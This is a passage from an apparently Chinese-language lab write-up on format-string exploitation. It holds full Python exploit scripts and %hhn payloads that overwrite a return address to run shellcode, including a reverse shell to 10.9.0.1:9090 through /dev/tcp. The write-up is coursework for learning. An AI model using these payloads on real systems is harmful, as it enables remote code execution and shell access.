class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte integer at offset 0</span></span><br><span class="line">number  = <span class="number">0x080e5068</span></span><br><span class="line">content[<span class="number">16</span>:<span class="number">20</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">number  = <span class="number">0x080e5069</span></span><br><span class="line">content[<span class="number">20</span>:<span class="number">24</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte string at offset 4</span></span><br><span class="line"><span class="comment"># content[4:8]  =  (&quot;abcd&quot;).encode(&#x27;latin-1&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to construct a string s with</span></span><br><span class="line"><span class="comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span></span><br><span class="line"><span class="comment"># s = &quot;%.8x&quot;*12 + &quot;%n&quot;</span></span><br><span class="line">s = <span class="string">r&quot;%68$n%80c%69$hhn&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The line shows how to store the string s at offset 8</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content[<span class="number">0</span>:<span class="number">0</span>+<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to badfile</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2022/04/14/input_check_lab/image-20220421105447481.png" alt="image-20220421105447481"></p><h3 id="part3"><a href="#part3" class="headerlink" title="part3"></a>part3</h3><p>和上面的原理基本类似。不过这里要写一个大的数字，并且没有\x00。那么我们就需要逐字节写入，防止一次性输入太多导致程序崩溃。</p><p>我们的payload构造如下所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">170</span>c%<span class="number">76</span>$hhn%<span class="number">17</span>c%<span class="number">77</span>$hhn%<span class="number">17</span>c%<span class="number">78</span>$hhn%<span class="number">17</span>c%<span class="number">79</span>$hhnaaa(<span class="number">0x080e506b</span>)(<span class="number">0x080e506a</span>)(<span class="number">0x080e5069</span>)(<span class="number">0x080e5068</span>)</span><br></pre></td></tr></table></figure><p>首先明确目标。我们要写入0xaabbccdd也就是<code>\xdd\xcc\xbb\xaa</code>。具体来说，0x080e506b需要写入\xaa，0x080e506a需要写入\xbb，0x080e5069需要写入\xcc，0x080e5068需要写入\xdd。下面解释一下payload。</p><p>第一个<code>%170c%76$hhn</code>表示以单字节单位写入170到第76个参数(也就是<code>0x080e506b</code>)由于0xaa就是170,并且0xaa最小，因此我们优先写入。</p><p>第二个<code>%17c%77$hhn</code>表示往<code>0x080e506a</code>写入0xbb。这里可能会纳闷，不是17=0x11吗，为什么是0xbb呢? 这是因为格式化字符串每次写入的数据不仅是%n之前的数字，还包括了之前输出的所有数据。之前我们已经输出了一个0xaa，那么我们只要加上0x11就到达0xbb，由此，我们可以写入到第二个参数位置。</p><p>同样的，我们要往第三个和第四个地址中分别写入0xcc和0xdd。由于差都是0x11，所以我们考虑倒着写入，这样就不用考虑怎样在前面已经输出一个很大的数的条件下怎样写一个小的数字的问题了。格式和之前两个都是类似的。注意最后补齐到4对齐，方便写入正确的地址。</p><p>完整的exp和测试截图如下所示。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize the content array</span></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte integer at offset 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte string at offset 4</span></span><br><span class="line"><span class="comment"># content[4:8]  =  (&quot;abcd&quot;).encode(&#x27;latin-1&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to construct a string s with</span></span><br><span class="line"><span class="comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span></span><br><span class="line"><span class="comment"># s = &quot;%.8x&quot;*12 + &quot;%n&quot;</span></span><br><span class="line">s = <span class="string">r&quot;%170c%76$hhn%17c%77$hhn%17c%78$hhn%17c%79$hhnaaa&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The line shows how to store the string s at offset 8</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content[<span class="number">0</span>:<span class="number">0</span>+<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line">number  = <span class="number">0x080e506b</span></span><br><span class="line">content[<span class="built_in">len</span>(fmt):<span class="built_in">len</span>(fmt)+<span class="number">4</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">number  = <span class="number">0x080e506a</span></span><br><span class="line">content[<span class="built_in">len</span>(fmt)+<span class="number">4</span>:<span class="built_in">len</span>(fmt)+<span class="number">8</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">number  = <span class="number">0x080e5069</span></span><br><span class="line">content[<span class="built_in">len</span>(fmt)+<span class="number">8</span>:<span class="built_in">len</span>(fmt)+<span class="number">12</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">number  = <span class="number">0x080e5068</span></span><br><span class="line">content[<span class="built_in">len</span>(fmt)+<span class="number">12</span>:<span class="built_in">len</span>(fmt)+<span class="number">16</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to badfile</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2022/04/14/input_check_lab/image-20220421105854846.png" alt="image-20220421105854846"></p><h2 id="task4"><a href="#task4" class="headerlink" title="task4"></a>task4</h2><p>这里要求注入shellcode。其实简单来说，我们只需要把程序的某个返回地址改成shellcode地址即可。借助于上面task3我们能够实现任意地址修改，这里也就不难了。</p><h3 id="question1"><a href="#question1" class="headerlink" title="question1"></a>question1</h3><p><img src="/2022/04/14/input_check_lab/image-20220421110303017.png" alt="image-20220421110303017"></p><p>为了用具体的地址表示，这里我就根据我的程序的输出来回答了。下面是我的程序的输出。</p><p><img src="/2022/04/14/input_check_lab/image-20220421110454979.png" alt="image-20220421110454979"></p><p>从下面这张图可以看出，2所在的地址是0xffffd21c，也就是myprintf的frame pointer+4。而3是main中buf的起始地址。也就是0xffffd2f0。</p><p><img src="/2022/04/14/input_check_lab/image-20220421110856086.png" alt="image-20220421110856086"></p><h3 id="question2"><a href="#question2" class="headerlink" title="question2"></a>question2</h3><p><img src="/2022/04/14/input_check_lab/image-20220421110907825.png" alt="image-20220421110907825"></p><p>计算一下，那其实就是1的地址和3的地址之差。但是1的地址好像程序没有输出，回看一下源码，应该是要减掉<code>dummy_function</code>中buffer的长度。因此其实也就是1中我们计算的64。所以我们需要64个%x到达3的位置。</p><h3 id="注入shellcode"><a href="#注入shellcode" class="headerlink" title="注入shellcode"></a>注入shellcode</h3><p>由于shellcode已经给好，我们要做的，就是改返回地址为shellcode的地址即可。我们完全可以仿照task3的步骤完成。只不过这里往目标地址写入的内容需要自己找。</p><p>首先确定我们payload的安排。由于printf每次会将之前已经写过的数据用%n放到对应位置，我们考虑将shellcode放在格式化字符串后面。这样我们可以更方便的控制已经写过的数据长度。</p><p>用图的形式表示我们写入的数据方式。如下所示。</p><p><img src="/2022/04/14/input_check_lab/image-20220422231520364.png" alt="image-20220422231520364"></p><p>解释一下我们构造的如下payload</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">208</span>c%<span class="number">75</span>$hhn%<span class="number">12</span>c%<span class="number">76</span>$hhn%<span class="number">35</span>c%<span class="number">77</span>$hhn%<span class="number">78</span>$hhnaaa(<span class="number">0xffffcfcd</span>)(<span class="number">0xffffcfcc</span>)(<span class="number">0xffffcfce</span>)(<span class="number">0xffffcfcf</span>)</span><br></pre></td></tr></table></figure><p>首先，为了传输上的方便，我们都采用单个字节写入。首先明确目的是把shellcode的地址写入目标地址<code>0xffffcfcc</code>。其中shellcode的地址是<code>0xffffd0dc</code>我们把它拆分成单字节。</p><p><code>%208c%75$hhn</code>这一步写入<code>0xffffcfcd</code>208也就是0xd0。</p><p><code>%12c%76$hhn</code>这一步写入<code>0xffffcfcc</code>(208+12)=220=0xdc</p><p><code>%35c%77$hhn</code>这一步写入<code>0xffffcfce</code>(208+12+35)=255=0xff</p><p><code>%78$hhn</code>这一步写入<code>0xffffcfcf</code>0xff(不写入新数据)</p><p>由此，我们完成了没有溢出的格式化字符串驶入数据，写入了一个<code>0xffffd0dc</code></p><p>发现程序输出了success，说明是可以成功的，接下来尝试打开反向shell即可。只需要把shellcode中的内容改成反向shell即可。</p><p><img src="/2022/04/14/input_check_lab/image-20220421123339345-16505156197111.png" alt="image-20220421123339345"></p><p><img src="/2022/04/14/input_check_lab/image-20220421123840114.png" alt="image-20220421123840114"></p><p>下面是完整的脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 32-bit Generic Shellcode </span></span><br><span class="line">shellcode_32 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 64-bit Generic Shellcode </span></span><br><span class="line">shellcode_64 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span></span><br><span class="line">   <span class="string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAAAAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBBBBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCCCCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDDDDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Choose the shellcode version based on your target</span></span><br><span class="line">shellcode = shellcode_32</span><br><span class="line"></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">0</span>               <span class="comment"># Change this number</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#    Construct the format string here</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">frame_pointer = <span class="number">0xffffcfc8</span></span><br><span class="line">ret = <span class="number">0xffffcfcc</span></span><br><span class="line">buffer_start = <span class="number">0xffffd0dc</span></span><br><span class="line">s = <span class="string">r&quot;%208c%75$hhn%12c%76$hhn%35c%77$hhn%78$hhnaaa&quot;</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content[start:start+<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line">number  = <span class="number">0xffffcfcd</span></span><br><span class="line">content[start+<span class="built_in">len</span>(fmt):start+<span class="built_in">len</span>(fmt)+<span class="number">4</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">number  = <span class="number">0xffffcfcc</span></span><br><span class="line">content[start+<span class="built_in">len</span>(fmt)+<span class="number">4</span>:start+<span class="built_in">len</span>(fmt)+<span class="number">8</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">number  = <span class="number">0xffffcfce</span></span><br><span class="line">content[start+<span class="built_in">len</span>(fmt)+<span class="number">8</span>:start+<span class="built_in">len</span>(fmt)+<span class="number">12</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">number  = <span class="number">0xffffcfcf</span></span><br><span class="line">content[start+<span class="built_in">len</span>(fmt)+<span class="number">12</span>:start+<span class="built_in">len</span>(fmt)+<span class="number">16</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(fmt)+<span class="number">16</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">content[start+<span class="built_in">len</span>(fmt)+<span class="number">16</span>:start+<span class="built_in">len</span>(fmt)+<span class="number">16</span>+<span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Save the format string to file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h2><p>和32位的思路一模一样。唯一不同的是文档中也提到的：64位地址中不可避免的会出现0。但是由于我们不用strcpy，用的是fgets，可以直接读入\x00。我们只需要这样构造格式化字符串的payload即可。</p><p><img src="/2022/04/14/input_check_lab/image-20220423144754472.png" alt="image-20220423144754472"></p><p>注意，和上面唯一不同的地方在于，这里的地址只能放在格式化字符串的后面。上面32位的可以放在前也能放在后。这里只能放在后面。因为如果Printf遇到00就不会接着往下打印，那么也就不会执行到我们上面黄色的格式化字符的地方。由于上面32位的我们也是将地址放在格式化字符串后面，所以基本没有什么问题。</p><p>下面最后解释一下payload</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">64</span>c%<span class="number">42</span>$hhn%<span class="number">63</span>c%<span class="number">43</span>$hhn%<span class="number">97</span>c%<span class="number">44</span>$hhn%<span class="number">31</span>c%<span class="number">45</span>$hhn%<span class="number">46</span>$hhn%<span class="number">47</span>$hhnaaaaba(<span class="number">0x00007fffffffdf18</span>)(<span class="number">0x00007fffffffdf1d</span>)(<span class="number">0x00007fffffffdf19</span>)(<span class="number">0x00007fffffffdf1b</span>)(<span class="number">0x00007fffffffdf1a</span>)(<span class="number">0x00007fffffffdf1c</span>)</span><br></pre></td></tr></table></figure><p><code>%64c%42$hhn</code>表示往<code>0x00007fffffffdf18</code>写入64也就是0x40。</p><p><code>%63c%43$hhn</code>表示往<code>0x00007fffffffdf1d</code>写入(63+64)也就是0x7f</p><p><code>%97c%44$hhn</code>表示往<code>0x00007fffffffdf19</code>写入(63+64+97)也就是0xe0</p><p><code>%31c%45$hhn</code>表示往<code>0x00007fffffffdf1b</code>写入(63+64+97+31)也就是0xff</p><p><code>%46$hhn%47$hhn</code>表示往<code>0x00007fffffffdf1a</code>以及<code>0x00007fffffffdf1c</code>写入0xff（和之前一样）。</p><p>综上所述，我们往0x00007fffffffdf18写入了0x7fffffe040。<strong>注意，小端法中高位是指先将数字转换为小端法之后的高位</strong>。例如<code>0x7fffffffe040</code>转换为<code>\x40\xe0\xff\xff\xff\x7f\x00\00</code>。其中00是转换后的最低位，因此要填充到地址的最高位。那么我们需要在相应字节如下填写。</p><p><img src="/2022/04/14/input_check_lab/image-20220423151615031.png" alt="image-20220423151615031"></p><p>这里也终于算是搞清楚了小端法的意义：我们首先把要储存的东西转化为小端法。例如0xdeadbeef就是\xef\xbe\xad\xde，之后储存就是从左往右依次储存，比如我们要存在0x1000的位置，那么0x1000就是\xef，0x1001就是\xbe，0x1002就是\xad，0x1003就是\xde，这个储存方法都是不变的，都是从左边开始往右边存。之前讲的什么低地址放高位之类的，真是害人不浅啊….</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 32-bit Generic Shellcode </span></span><br><span class="line">shellcode_32 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 64-bit Generic Shellcode </span></span><br><span class="line">shellcode_64 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span></span><br><span class="line">   <span class="string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAAAAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBBBBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCCCCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDDDDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Choose the shellcode version based on your target</span></span><br><span class="line">shellcode = shellcode_64</span><br><span class="line"></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">0</span>               <span class="comment"># Change this number</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#    Construct the format string here</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">frame_pointer = <span class="number">0x00007fffffffdf10</span></span><br><span class="line">ret = <span class="number">0x00007fffffffdf18</span></span><br><span class="line">buffer_start = <span class="number">0x00007fffffffdfd0</span></span><br><span class="line">s = <span class="string">r&quot;%64c%42$hhn%63c%43$hhn%97c%44$hhn%31c%45$hhn%46$hhn%47$hhnaaaaba&quot;</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content[start:start+<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line">number  = <span class="number">0x00007fffffffdf18</span></span><br><span class="line">content[start+<span class="built_in">len</span>(fmt):start+<span class="built_in">len</span>(fmt)+<span class="number">8</span>]  =  (number).to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">number  = <span class="number">0x00007fffffffdf1d</span></span><br><span class="line">content[start+<span class="built_in">len</span>(fmt)+<span class="number">8</span>:start+<span class="built_in">len</span>(fmt)+<span class="number">16</span>]  =  (number).to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">number  = <span class="number">0x00007fffffffdf19</span></span><br><span class="line">content[start+<span class="built_in">len</span>(fmt)+<span class="number">16</span>:start+<span class="built_in">len</span>(fmt)+<span class="number">24</span>]  =  (number).to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">number  = <span class="number">0x00007fffffffdf1b</span></span><br><span class="line">content[start+<span class="built_in">len</span>(fmt)+<span class="number">24</span>:start+<span class="built_in">len</span>(fmt)+<span class="number">32</span>]  =  (number).to_bytes(<span class="number">8</span>,byteorder=<span 